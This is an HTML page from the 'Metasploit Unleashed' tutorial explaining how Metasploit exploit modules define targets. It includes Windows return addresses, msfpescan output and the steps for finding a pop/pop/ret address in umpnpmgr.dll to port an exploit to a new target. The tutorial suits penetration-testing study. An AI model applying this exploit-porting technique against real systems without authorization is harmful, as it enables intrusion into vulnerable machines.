<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
  <meta content="text/html; charset=ISO-8859-1"
 http-equiv="Content-Type">
  <title>Metasploit Exploit Targets</title>
<link rel="stylesheet" type="text/css" href="/home/steve/metasploit_unleashed/css.css" /></head>
<body>
<h1 style="color: rgb(0, 0, 0);" id="firstHeading" class="firstHeading">Metasploit
Exploit Targets</h1>
<h3 style="color: rgb(0, 0, 0);" id="siteSub">From Metasploit Unleashed
- Mastering The Framework</h3>
<p style="color: rgb(0, 0, 0);">Exploits define a list of targets that
includes a name, number, and options. Targets are specified by number
when launched.
<br>
<br>
</p>
<pre id="code">'Targets' =&gt;<br>          [<br>                 # Windows 2000 &#8211; TARGET = 0<br>                 [<br>                      'Windows 2000 English',<br>                      {<br>                           'Rets' =&gt; [ 0x773242e0 ],                                           <br>                      },<br>                 ],<br>                 # Windows XP - TARGET = 1<br>                 [<br>                      'Windows XP English',<br>                      {<br>                           'Rets' =&gt; [ 0x7449bf1a ],<br>                      },<br>                 ],              <br>          ],<br>'DefaultTarget' =&gt; 0))</pre>
<h4 style="color: rgb(0, 0, 0);"> <span class="mw-headline"
 id="Target_Options_Block">Target Options Block</span></h4>
<p style="color: rgb(0, 0, 0);">The options block within the target
section is nearly free-form although there are some special option
names.
</p>
<dl style="color: rgb(0, 0, 0);">
  <dd>
    <ul>
      <li>'Ret' is short-cutted as target.ret()
      </li>
      <li>'Payload' overloads the exploits info block
      </li>
    </ul>
  </dd>
</dl>
<p style="color: rgb(0, 0, 0);">Options are where you store target
data. For example:
</p>
<dl style="color: rgb(0, 0, 0);">
  <dd>
    <ul>
      <li>The return address for a Windows 2000 target
      </li>
      <li>500 bytes of padding need to be added for Windows XP targets
      </li>
      <li>Windows Vista NX bypass address
      </li>
    </ul>
  </dd>
</dl>
<h4 style="color: rgb(0, 0, 0);"> <span class="mw-headline"
 id="Accessing_Target_Information">Accessing Target Information</span></h4>
<p style="color: rgb(0, 0, 0);">The 'target' object inside the exploit
is the users selected target and is accessed in the exploit as a hash.
</p>
<dl style="color: rgb(0, 0, 0);">
  <dd>
    <ul>
      <li>target['padcount']
      </li>
      <li>target['Rets'][0]
      </li>
      <li>target['Payload']['BadChars']
      </li>
      <li>target['opnum']
      </li>
    </ul>
  </dd>
</dl>
<h4 style="color: rgb(0, 0, 0);"> <span class="mw-headline"
 id="Adding_and_Fixing_Exploit_Targets">Adding and Fixing Exploit
Targets</span></h4>
<p style="color: rgb(0, 0, 0);">Sometimes you need new targets because
a particular language pack
changes addresses, a different version of the software is available, or
the addresses are shifted due to hooks. Adding a new target only
requires 3 steps.
</p>
<dl style="color: rgb(0, 0, 0);">
  <dd>
    <ul>
      <li>Determine the type of return address you require. This
could be a simple 'jmp esp', a jump to a specific register, or a
'pop/pop/ret'. Comments in the exploit code can help you determine what
is required.
      </li>
      <li>Obtain a copy of the target binaries
      </li>
      <li>Use msfpescan to locate a suitable return address
      </li>
    </ul>
  </dd>
</dl>
<p style="color: rgb(0, 0, 0);">If the exploit code doesn't explicitly
tell you what type of return
address is required but is good enough to tell you the dll name for the
existing exploit, you can find out what type of return address you are
looking for. Consider the following example that provides a return
address for a Windows 2000 SP0-SP4 target.
<br>
<br>
</p>
<pre id="code">'Windows 2000 SP0-SP4',<br>{<br>          'Ret'          =&gt; 0x767a38f6,  # umpnpmgr.dll<br>}</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">To find out what type of return
address the exploit currently uses,
we just need to find a copy of umpnpmgr.dll from a Windows 2000 machine
machine and run msfpescan with the provided address to determine the
return type. In the example below, we can see that this exploit
requires a pop/pop/ret.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code">root@bt4:/pentest/exploits/framework3# ./msfpescan -D -a 0x767a38f6 win2000sp4.umpnpmgr.dll<br>[win200sp4.umpnpmgr.dll]<br>0x767a38f6 5f5ec3558bec6aff68003c7a7668e427<br>00000000 5F                pop edi<br>00000001 5E                pop esi<br>00000002 C3                ret<br>00000003 55                push ebp<br>00000004 8BEC              mov ebp,esp<br>00000006 6AFF              push byte -0x1<br>00000008 68003C7A76        push 0x767a3c00<br>0000000D 68                db 0x68<br>0000000E E427              in al,0x27</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Now, we just need to grab a copy of
the target dll and use msfpescan to find a usable pop/pop/ret address
for us.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code">root@bt4:/pentest/exploits/framework3# ./msfpescan -p targetos.umpnpmgr.dll<br>[targetos.umpnpmgr.dll]<br>0x79001567 pop eax; pop esi; ret<br>0x79011e0b pop eax; pop esi; retn 0x0008<br>0x79012749 pop esi; pop ebp; retn 0x0010<br>0x7901285c pop edi; pop esi; retn 0x0004</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Now that we've found a suitable
return address, we add our new target to the exploit.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code">'Windows 2000 SP0-SP4 Russian Language',<br>{<br>          'Ret'          =&gt; 0x7901285c,  # umpnpmgr.dll<br>}</pre>
<br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<div style="text-align: center; color: rgb(0, 0, 0);"><a
 href="http://www.offensive-security.com/metasploit-unleashed/Exploit_Development"
 title="Exploit Development">Exploit Development</a></div>
</body>
</html>
